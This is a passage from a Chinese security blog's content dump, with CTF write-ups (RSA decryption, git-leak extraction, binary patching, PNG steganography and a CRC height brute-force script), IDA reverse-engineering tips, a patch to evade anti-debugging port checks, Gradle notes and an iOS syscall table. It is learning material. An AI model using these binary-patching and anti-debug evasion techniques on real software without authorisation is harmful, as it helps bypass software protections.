class="string">&quot;encrypted.message1&quot;</span> , <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ret += (rsa.decrypt(f.read(), privatekey).decode())</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;encrypted.message2&quot;</span> , <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ret += (rsa.decrypt(f.read(), privatekey).decode())</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;encrypted.message3&quot;</span> , <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ret += (rsa.decrypt(f.read(), privatekey).decode())</span><br><span class="line"><span class="built_in">print</span>(ret)</span><br></pre></td></tr></table></figure>
<p>得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;3b6d3806-4b2b</span><br><span class="line">-11e7-95a0-</span><br><span class="line">000c29d7e93d&#125;</span><br></pre></td></tr></table></figure>
<p>去掉回车得到最终flag</p>
<h3 id="不使用rsa模块"><a href="#不使用rsa模块" class="headerlink" title="不使用rsa模块"></a>不使用rsa模块</h3><p>其实就是自己实现<code>rsa.decrypt</code>中的转换16进制操作<br>以第一个文件为例，解密出来转化为16进制：<br><code>25a8007e9ad2809abbf5a00666c61677b33623664333830362d346232620a</code><br>位数为奇数，所以左边补0，得到<br><code>025a8007e9ad2809abbf5a00666c61677b33623664333830362d346232620a</code><br>转换为ascii码得到<br><code>Z��(    ��Z�flag&#123;3b6d3806-4b2b</code></p>
<p>剩下文件同理</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/xiangshangbashaonian/article/details/79575062">i春秋第二届春秋欢乐赛RSA256writeup</a></p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo&#39;s Usage</title>
    <url>/2018/11/28/hello-world/</url>
    <content><![CDATA[<h2 id="My-Usage-After-changing-some-files"><a href="#My-Usage-After-changing-some-files" class="headerlink" title="My Usage (After changing some files)"></a>My Usage (After changing some files)</h2><h3 id="On-local-server"><a href="#On-local-server" class="headerlink" title="On local server"></a>On local server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</span><br></pre></td></tr></table></figure>
<h3 id="Deploy-to-Github-After-checking"><a href="#Deploy-to-Github-After-checking" class="headerlink" title="Deploy to Github(After checking)"></a>Deploy to Github(After checking)</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo d</span><br></pre></td></tr></table></figure>

<p>Reference: <a href="https://blog.ctftools.com/2017/12/post233/">Hexo安装配置并托管至github</a></p>
]]></content>
      <tags>
        <tag>经验</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋 第二届春秋欢乐赛 ReCreators&amp;Hello World Writeup</title>
    <url>/2019/01/26/icq-2nd-happy-rec/</url>
    <content><![CDATA[<h2 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h2><h3 id="观察"><a href="#观察" class="headerlink" title="观察"></a>观察</h3><p>浏览器打开，只有一个<code>Hello, World!</code><br>查看源代码看到有个</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;flag.xmas.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>结果没有该文件，尝试打开<code>flag.js</code>，看到混淆过的js，全选复制，放到控制台运行，得到</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> Key = <span class="string">&quot;7a57a5a743894a0e&quot;</span>;</span><br><span class="line">CryptoJS.pad.Iso10126 = &#123;</span><br><span class="line">    <span class="attr">pad</span>: <span class="function"><span class="keyword">function</span>(<span class="params">data, blockSize</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> blockSizeBytes = blockSize * <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">var</span> nPaddingBytes = blockSizeBytes - data.sigBytes % blockSizeBytes;</span><br><span class="line">        data.concat(CryptoJS.lib.WordArray.random(nPaddingBytes - <span class="number">1</span>)).concat(CryptoJS.lib.WordArray.create([nPaddingBytes &lt;&lt; <span class="number">24</span>], <span class="number">1</span>))</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">unpad</span>: <span class="function"><span class="keyword">function</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> nPaddingBytes = data.words[(data.sigBytes - <span class="number">1</span>) &gt;&gt;&gt; <span class="number">2</span>] &amp; <span class="number">0xff</span>;</span><br><span class="line">        data.sigBytes -= nPaddingBytes</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> aesEncrypt = <span class="function"><span class="keyword">function</span>(<span class="params">data, keyStr, ivStr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> sendData = CryptoJS.enc.Utf8.parse(data);</span><br><span class="line">    <span class="keyword">var</span> key = CryptoJS.enc.Utf8.parse(keyStr);</span><br><span class="line">    <span class="keyword">var</span> iv = CryptoJS.enc.Utf8.parse(ivStr);</span><br><span class="line">    <span class="keyword">var</span> encrypted = CryptoJS.AES.encrypt(sendData, key, &#123;</span><br><span class="line">        <span class="attr">iv</span>: iv,</span><br><span class="line">        <span class="attr">mode</span>: CryptoJS.mode.CBC,</span><br><span class="line">        <span class="attr">padding</span>: CryptoJS.pad.Iso10126</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> CryptoJS.enc.Base64.stringify(encrypted.ciphertext)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> aesDecrypt = <span class="function"><span class="keyword">function</span>(<span class="params">data, keyStr, ivStr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> key = CryptoJS.enc.Utf8.parse(keyStr);</span><br><span class="line">    <span class="keyword">var</span> iv = CryptoJS.enc.Utf8.parse(ivStr);</span><br><span class="line">    <span class="keyword">var</span> decrypted = CryptoJS.AES.decrypt(data, key, &#123;</span><br><span class="line">        <span class="attr">iv</span>: iv,</span><br><span class="line">        <span class="attr">mode</span>: CryptoJS.mode.CBC,</span><br><span class="line">        <span class="attr">padding</span>: CryptoJS.pad.Iso10126</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">return</span> decrypted.toString(CryptoJS.enc.Utf8)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> hint = <span class="string">&quot;SSNRTPIuHLUxqtJmq8mDDPtexRU7RTjNO34tLqz+Tpw=&quot;</span>;</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<p>然而，这并没有什么用。。。。<br>得到的提示是<code>flag is not here</code></p>
<h3 id="使用工具进行git泄露"><a href="#使用工具进行git泄露" class="headerlink" title="使用工具进行git泄露"></a>使用工具进行git泄露</h3><p>搜索该题得到提示<code>git泄露</code>，于是再次搜索<code>git泄露</code>，发现例题就是这题。。。。<br>使用<a href="https://github.com/gakki429/Git_Extract">Git_Extract</a>提取（注意：需使用Python2）<br>对比flag文件的差异得到flag(有修改和删除字符)</p>
<h2 id="ReCreators"><a href="#ReCreators" class="headerlink" title="ReCreators"></a>ReCreators</h2><p>下回来一个没有后缀的文件，所以先要判断它是什么文件</p>
<h3 id="修复文件后缀"><a href="#修复文件后缀" class="headerlink" title="修复文件后缀"></a>修复文件后缀</h3><p>使用<code>010Editor</code>打开，发现是<code>.vmdk</code>文件，于是加上后缀，使用<code>FTK Imager</code>打开<br>发现有一个<code>misc.mp4</code>，提取出来，使用<code>010Editor</code>打开，在靠近末尾处发现一大串数字字符，推测是16进制<br>（mp4是Re:CREATORS的片头）<br>(字符串在本文最后)</p>
<h3 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h3><p>发现其实就是几种方式混合在一起，不断解密即可得到flag<br>具体顺序如下：<br>HexDecode两次<br>Base32Decode三次<br>Base64Decode两次<br>HexDecode一次<br>Base32Decode一次<br>Base64Decode两次<br>得到flag：<code>flag&#123;wh4t_a_w0nderfu1_d4y&#125;</code></p>
<h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="linespan><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>IDA不能F5查看伪代码的解决方法(call analysis failed)</title>
    <url>/2019/02/16/ida-call-analysis-fail/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>选定代码段后，按P创建函数，无法F5，提示<code>call analysis failed</code>。</p>
<h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><blockquote>
<p>1、IDA无法识别出正确的调用约定(calling convention)；<br>2、IDA无法识别出正确的参数个数。</p>
</blockquote>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="方法1-IDA自动分析"><a href="#方法1-IDA自动分析" class="headerlink" title="方法1 - IDA自动分析"></a>方法1 - IDA自动分析</h3><p>定位到报错的代码位置，双击调用的函数，进入后按一次F5，再返回就可以F5了。</p>
<h3 id="方法2-修改参数个数"><a href="#方法2-修改参数个数" class="headerlink" title="方法2 - 修改参数个数"></a>方法2 - 修改参数个数</h3><p>定位到报错的代码位置，鼠标点击调用的函数，按下Y键，修改参数个数。<br>比如将<code>(_JNIEnv *, int, int, int, int, int, int, int);</code>改为<code>(_JNIEnv *, int, int, int);</code></p>
<p>具体参数个数，需要根据函数调用约定及汇编代码确定（看它传入了几个参数）。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://bbs.pediy.com/thread-158896.htm">IDA sp-analysis failed 不能F5的 解决方案之(二)</a><br><a href="https://blog.csdn.net/xiangshangbashaonian/article/details/82889924">解决IDA出现Decompilation failure: call analysis failed不可以F5的问题</a><br><a href="https://www.cnblogs.com/echo579/p/6564433.html">IDA反编译失败-call analysis failed</a></p>
]]></content>
      <tags>
        <tag>IDA</tag>
      </tags>
  </entry>
  <entry>
    <title>Gradle配置版本号自动增加</title>
    <url>/2021/10/07/gradle-auto-version-code/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>通过搜索引擎，学习一下如何配置版本号自增。</p>
<h2 id="增加函数"><a href="#增加函数" class="headerlink" title="增加函数"></a>增加函数</h2><p>修改<code>app</code>模块的<code>build.gradle</code>，增加<code>getVersionCode</code>函数</p>
<span id="more"></span>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">def <span class="title">getVersionCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    def versionFile = file(<span class="string">&#x27;version.properties&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> (!versionFile.exists()) &#123;</span><br><span class="line">        Properties versionProps = <span class="keyword">new</span> Properties()</span><br><span class="line">        versionProps.setProperty(<span class="string">&quot;VERSION_CODE&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">        versionFile.createNewFile();</span><br><span class="line">        versionProps.store(versionFile.newWriter(), <span class="keyword">null</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (versionFile.canRead()) &#123;</span><br><span class="line">        Properties versionProps = <span class="keyword">new</span> Properties()</span><br><span class="line">        versionProps.load(<span class="keyword">new</span> FileInputStream(versionFile))</span><br><span class="line">        def versionCode = versionProps[<span class="string">&#x27;VERSION_CODE&#x27;</span>].toInteger()</span><br><span class="line">        def runTasks = gradle.startParameter.<span class="function">taskNames</span></span><br><span class="line"><span class="function">        <span class="title">println</span><span class="params">(<span class="string">&quot;runTasks:&quot;</span> + runTasks)</span></span></span><br><span class="line"><span class="function">        def isDebug </span>= <span class="string">&#x27;:app:assembleDebug&#x27;</span> in runTasks</span><br><span class="line">        def isRelease = <span class="string">&#x27;:app:assembleRelease&#x27;</span> <span class="function">in runTasks</span></span><br><span class="line"><span class="function">        <span class="title">if</span> <span class="params">(isRelease || isDebug)</span> </span>&#123;</span><br><span class="line">            versionProps[<span class="string">&#x27;VERSION_CODE&#x27;</span>] = (++versionCode).toString()</span><br><span class="line">            versionProps.store(versionFile.newWriter(), <span class="keyword">null</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> versionCode</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="调用"><a href="#调用" class="headerlink" title="调用"></a>调用</h2><p>修改<code>android</code>以及<code>android.defaultConfig</code></p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">android &#123;</span><br><span class="line">    def curVersionCode = getVersionCode()</span><br><span class="line"></span><br><span class="line">    defaultConfig &#123;</span><br><span class="line">        versionCode curVersionCode</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/shiquanqq/article/details/77942047">Android自定义apk名称、版本号自增</a></p>
]]></content>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>修改IDA android_server默认端口</title>
    <url>/2019/09/13/ida-as-port-reverse/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>有的反调试会检测<code>23946</code>端口是否占用，使用其他端口即可绕过此反调试。<br>可以使用<code>./android_server -p12345</code>指定端口，也可以使用<code>IDA</code>逆向，修改默认端口。</p>
<h2 id="测试版本"><a href="#测试版本" class="headerlink" title="测试版本"></a>测试版本</h2><p>IDA 7.0</p>
<h2 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h2><p>使用<code>IDA</code>打开<code>android_server</code>，搜索字符串<code>Listening on</code>，定位到引用位置。<br>按下F5反编译，重命名端口号变量。按下x，向上搜索找到赋值位置（可能有多处），patch即可。<br>附上偏移值：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0xAFE0 LDR     R2, =23946</span><br><span class="line">0xB220 LDR     R1, =23946</span><br></pre></td></tr></table></figure>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/jiaoxiake/p/6801093.html">浅谈android反调试之 转发端口</a></p>
]]></content>
      <tags>
        <tag>IDA</tag>
      </tags>
  </entry>
  <entry>
    <title>IDA不能F5查看伪代码的解决方法（positive sp value）</title>
    <url>/2018/11/30/ida-positive-sp/</url>
    <content><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p><img src="http://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/ida_2018-11-30_08-30-12.png"><br>在函数中F5失败，提示堆栈指针为正数，故需要修复堆栈平衡</p>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>去设置中打开堆栈指针（Stack pointer）显示（也就是sp）<br><img src="http://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/ida_2018-11-30_08-33-01.png"></p>
<p>按G定位到4012B9，发现return时的指针是-10（hex）<br><img src="http://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/ida_2018-11-30_08-34-15.png"></p>
<p>找到最接近的call（401295），在该行修改sp值（按alt+K或者右键修改）,设置偏移值为-0x10<br>（目的就是使return前的sp为0）<br><img src="http://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/ida_2018-11-30_09-55-41.png"><br>修复后：<br><img src="http://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/ida_2018-11-30_08-35-09.png"><br>然后就可以愉快地F5了</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://bbs.pediy.com/thread-158896.htm">IDA sp-analysis failed 不能F5的 解决方案之(二)</a><br><a href="https://bbs.pediy.com/thread-140002.htm">IDA sp-analysis failed 不能F5的 解决方案之(一)</a></p>
]]></content>
      <tags>
        <tag>IDA</tag>
      </tags>
  </entry>
  <entry>
    <title>IDAPython 旧版脚本的使用与升级</title>
    <url>/2021/12/04/idapython-scripts-upgrade/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>执行旧版的<code>IDAPython</code>脚本，提示找不到方法。(如：<code>AttributeError: module &#39;idc&#39; has no attribute &#39;MakeUnknown&#39;</code>）<br>因为<code>IDA 7.0</code>更新了API，并且从<code>7.1</code>开始默认关闭<code>AUTOIMPORT_COMPAT_IDA695</code></p>
<p>查看源码（<code>python/3/</code>），发现<code>idc_bc695.py</code>包含旧版api与新版的对应关系。</p>
<h2 id="官方文档"><a href="#官方文档" class="headerlink" title="官方文档"></a>官方文档</h2><p><a href="https://hex-rays.com/products/ida/news/7_0/docs/idapython_backward_compat_695/">IDA 7.0: IDAPython backward-compatibility with 6.95 APIs</a></p>
<p><a href="https://hex-rays.com/products/ida/news/7_0/docs/api70_porting_guide/">IDA 7.0 SDK: Porting from IDA 4.9-6.x API to IDA 7.0 API</a></p>
<h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="法1-升级脚本"><a href="#法1-升级脚本" class="headerlink" title="法1 升级脚本"></a>法1 升级脚本</h3><p>参照<code>idc_bc695.py</code>，将脚本升级到新版</p>
<h3 id="法2-使用idc-bc695"><a href="#法2-使用idc-bc695" class="headerlink" title="法2 使用idc_bc695"></a>法2 使用idc_bc695</h3><p>将脚本中的模块名<code>idc</code>替换为<code>idc_bc695</code>即可</p>
<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p><a href="https://wonderkun.cc/2020/12/11/idapython%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/">idapython使用笔记</a></p>
]]></content>
      <tags>
        <tag>IDA</tag>
      </tags>
  </entry>
  <entry>
    <title>isa_ctf1</title>
    <url>/2018/11/29/isa-ctf1/</url>
    <content><![CDATA[<h2 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h2><ol>
<li>   直接查看源代码<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/ctf1_sign1.png"></li>
<li>   注意到url命名不正常 (居然是indxe.htm)<br>使用Fiddler请求index.htm文件<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/ctf1_sign2.png"><span id="more"></span>
<h2 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h2></li>
</ol>
<p>拖进IDA，查看一下伪C代码，入口处设置了rand的seed，因此查看调用_rand的函数<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/ctf1_debug_0.png"></p>
<p><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/ctf1_debug_1.png"><br>发现只有prlntf函数调用了，于是查看该函数</p>
<p><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/ctf1_debug_2.png"></p>
<p>这就是关键代码了。</p>
<p>接下来计算call的偏移地址，把调用puts改为调用prlntf<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/ctf1_debug_3.png"><br>所以需要知道2A FF FF FF是怎么来的 (EB就是call)</p>
<p><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/ctf1_debug_4.png"><br>_puts相对于当前代码00401CE1 的偏移值为 E1-10 =D1<br>而FF-2A=D5 D5=D1+4<br>所以2A = FF –(D1+4)</p>
<p>而prlntf相对于当前代码00401CE1的偏移值为 CE1-370 =971<br>所以所求值= FFFF –(971+4)= F68A</p>
<p>所以打开IDA的Hex视图，修改2A FF 为8A F6（刚开始改的F68A，是错误的，参考了一下上面调用__main的偏移发现要倒过来写）</p>
<p><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/ctf1_debug_5.png"></p>
<p>保存后返回，发现已经变成调用prlntf函数了（这仅仅是在IDA中修改了，真正修改需要使用2进制编辑工具修改才能生效）</p>
<p><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/ctf1_debug_6.png"></p>
<p>接下来有两种方法（区别仅仅在于是否永久修改Hex）：</p>
<ol>
<li>   在call puts处下断点，动态调试，运行到断点处在HexView中手动修改跳转偏移，同时在调用prlntf的下一行下断，以便观察输出的flag</li>
<li>   使用2进制编辑工具修改生效后，由于程序一闪而过，所以继续IDA动态调试，调用prlntf的下一行下断，以便观察输出的flag</li>
</ol>
<p><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/ctf1_debug_7.png"></p>
<h2 id="大佬的凝视"><a href="#大佬的凝视" class="headerlink" title="大佬的凝视"></a>大佬的凝视</h2><p>图片为PNG格式，直接拖进010搜png文件尾，发现附加有RAR文件</p>
<p><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/ctf1_dalao_0.png"></p>
<p>截断，复制到新文件中，发现有密码（经测试不是伪加密，密码也没跑出来，还试了图片中的日文，也是错误的<br>使用Stegsolve查看图片，发现Blue色道可疑<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/ctf1_dalao_1.png"></p>
<p>使用Analyse-&gt;Data Extract发现压缩包密码<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/ctf1_dalao_2.png"><br>解压缩以后得到flag.zip，发现是伪加密，修复后解压出其中的flag.txt，是一段base64后的字符串<br>解base64得到flag<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/ctf1_dalao_3.png"></p>
<h2 id="So-easy"><a href="#So-easy" class="headerlink" title="So_easy"></a>So_easy</h2><p>直接拖进010搜png文件尾，发现附加有一段字符串和一个RAR文件<br> <img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/ctf1_soeasy_0.png"><br>字符串结尾是3D3D猜测是base64，16进制转10进制字符串后解码base64，得到提示</p>
<blockquote>
<p>hint:the password is what you see!</p>
</blockquote>
<p>由于是rar，可设置中文密码，输入“优雅矜持端庄腿麻站会儿”解压得到一张明显修改了高度的图片，直接暴力修改高度为1024得到flag<br>（用脚本爆破高度也行，脚本见下文）<br> <img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/ctf1_soeasy_1.png"></p>
<h2 id="学姐真美"><a href="#学姐真美" class="headerlink" title="学姐真美"></a>学姐真美</h2><p>拖进010，搜文件尾，发现附加有一个不知道是啥的文件，街区提取之<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/ctf1_xuejie_0.png"></p>
<p>经观察推测是png文件(有IHDR)，修复文件头后显示出一张图<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/ctf1_xuejie_1.png"><br>继续拖进010，提示crc32校验错误，利用python脚本跑出正确高度为620，修改后显示出一个二维码</p>
<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">misc = <span class="built_in">open</span>(<span class="string">&quot;lalalaa.png&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1024</span>):</span><br><span class="line">    data = misc[<span class="number">12</span>:<span class="number">20</span>] + struct.pack(<span class="string">&#x27;&gt;i&#x27;</span>,i)+ misc[<span class="number">24</span>:<span class="number">29</span>]</span><br><span class="line">    crc32 = binascii.crc32(data) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    <span class="keyword">if</span> crc32 == <span class="number">0xA9B72B91</span>:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>
<p>解码得到一个提示</p>
<blockquote>
<p>pass is 13bytes,please input its hex value.u must know where is wrong :P.</p>
</blockquote>
<p>IHDR是13字节，pass就是密码的缩写，所以文件需要解密<br>使用steghide解密得到flag</p>
<h2 id="突破重围"><a href="#突破重围" class="headerlink" title="突破重围"></a>突破重围</h2><p>得到的是一个bmp文件（后面一大堆空字节, 直接删除），拖进010，<br>经观察16进制，感觉应该是png文件(有IHDR)，修复文件头后显示出第一层key<br><img src="https://xhy-1252675344.cos.ap-beijing.myqcloud.com/imgs/ctf1_tpcw_0.png"><br>搜文件尾，发现附加有RAR文件，导出<br>解压得到wave.mp3和sinx_cosx.rar（又有密码。。。。<br>应该解析波形得出密码吧。。。。<br>还有第三层。。。。<br>到此放弃</p>
<h2 id="关于逆向题"><a href="#关于逆向题" class="headerlink" title="关于逆向题"></a>关于逆向题</h2><p>拖进IDA，找到了关键代码，然而，不会解啊= =</p>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>iOS syscall table</title>
    <url>/2022/11/21/ios-syscall-table/</url>
    <content><![CDATA[<h2 id="Note"><a href="#Note" class="headerlink" title="Note"></a>Note</h2><p>From: <a href="https://opensource.apple.com/source/xnu/xnu-1228/bsd/sys/syscall.h.auto.html">syscall.h - Apple Open Source</a></p>
<span id="more"></span>

<h2 id="Table"><a href="#Table" class="headerlink" title="Table"></a>Table</h2><table>
<thead>
<tr>
<th align="center">NR</th>
<th>syscall name</th>
<th align="center">%x8</th>
</tr>
</thead>
<tbody><tr>
<td align="center">0</td>
<td>SYS_syscall</td>
<td align="center">0x0</td>
</tr>
<tr>
<td align="center">1</td>
<td>SYS_exit</td>
<td align="center">0x1</td>
</tr>
<tr>
<td align="center">2</td>
<td>SYS_fork</td>
<td align="center">0x2</td>
</tr>
<tr>
<td align="center">3</td>
<td>SYS_read</td>
<td align="center">0x3</td>
</tr>
<tr>
<td align="center">4</td>
<td>SYS_write</td>
<td align="center">0x4</td>
</tr>
<tr>
<td align="center">5</td>
<td>SYS_open</td>
<td align="center">0x5</td>
</tr>
<tr>
<td align="center">6</td>
<td>SYS_close</td>
<td align="center">0x6</td>
</tr>
<tr>
<td align="center">7</td>
<td>SYS_wait4</td>
<td align="center">0x7</td>
</tr>
<tr>
<td align="center">9</td>
<td>SYS_link</td>
<td align="center">0x9</td>
</tr>
<tr>
<td align="center">10</td>
<td>SYS_unlink</td>
<td align="center">0xa</td>
</tr>
<tr>
<td align="center">12</td>
<td>SYS_chdir</td>
<td align="center">0xc</td>
</tr>
<tr>
<td align="center">13</td>
<td>SYS_fchdir</td>
<td align="center">0xd</td>
</tr>
<tr>
<td align="center">14</td>
<td>SYS_mknod</td>
<td align="center">0xe</td>
</tr>
<tr>
<td align="center">15</td>
<td>SYS_chmod</td>
<td align="center">0xf</td>
</tr>
<tr>
<td align="center">16</td>
<td>SYS_chown</td>
<td align="center">0x10</td>
</tr>
<tr>
<td align="center">17</td>
<td>SYS_obreak</td>
<td align="center">0x11</td>
</tr>
<tr>
<td align="center">18</td>
<td>SYS_ogetfsstat</td>
<td align="center">0x12</td>
</tr>
<tr>
<td align="center">18</td>
<td>SYS_getfsstat</td>
<td align="center">0x12</td>
</tr>
<tr>
<td align="center">20</td>
<td>SYS_getpid</td>
<td align="center">0x14</td>
</tr>
<tr>
<td align="center">23</td>
<td>SYS_setuid</td>
<td align="center">0x17</td>
</tr>
<tr>
<td align="center">24</td>
<td>SYS_getuid</td>
<td align="center">0x18</td>
</tr>
<tr>
<td align="center">25</td>
<td>SYS_geteuid</td>
<td align="center">0x19</td>
</tr>
<tr>
<td align="center">26</td>
<td>SYS_ptrace</td>
<td align="center">0x1a</td>
</tr>
<tr>
<td align="center">27</td>
<td>SYS_recvmsg</td>
<td align="center">0x1b</td>
</tr>
<tr>
<td align="center">28</td>
<td>SYS_sendmsg</td>
<td align="center">0x1c</td>
</tr>
<tr>
<td align="center">29</td>
<td>SYS_recvfrom</td>
<td align="center">0x1d</td>
</tr>
<tr>
<td align="center">30</td>
<td>SYS_accept</td>
<td align="center">0x1e</td>
</tr>
<tr>
<td align="center">31</td>
<td>SYS_getpeername</td>
<td align="center">0x1f</td>
</tr>
<tr>
<td align="center">32</td>
<td>SYS_getsockname</td>
<td align="center">0x20</td>
</tr>
<tr>
<td align="center">33</td>
<td>SYS_access</td>
<td align="center">0x21</td>
</tr>
<tr>
<td align="center">34</td>
<td>SYS_chflags</td>
<td align="center">0x22</td>
</tr>
<tr>
<td align="center">35</td>
<td>SYS_fchflags</td>
<td align="center">0x23</td>
</tr>
<tr>
<td align="center">36</td>
<td>SYS_sync</td>
<td align="center">0x24</td>
</tr>
<tr>
<td align="center">37</td>
<td>SYS_kill</td>
<td align="center">0x25</td>
</tr>
<tr>
<td align="center">39</td>
<td>SYS_getppid</td>
<td align="center">0x27</td>
</tr>
<tr>
<td align="center">41</td>
<td>SYS_dup</td>
<td align="center">0x29</td>
</tr>
<tr>
<td align="center">42</td>
<td>SYS_pipe</td>
<td align="center">0x2a</td>
</tr>
<tr>
<td align="center">43</td>
<td>SYS_getegid</td>
<td align="center">0x2b</td>
</tr>
<tr>
<td align="center">44</td>
<td>SYS_profil</td>
<td align="center">0x2c</td>
</tr>
<tr>
<td align="center">46</td>
<td>SYS_sigaction</td>
<td align="center">0x2e</td>
</tr>
<tr>
<td align="center">47</td>
<td>SYS_getgid</td>
<td align="center">0x2f</td>
</tr>
<tr>
<td align="center">48</td>
<td>SYS_sigprocmask</td>
<td align="center">0x30</td>
</tr>
<tr>
<td align="center">49</td>
<td>SYS_getlogin</td>
<td align="center">0x31</td>
</tr>
<tr>
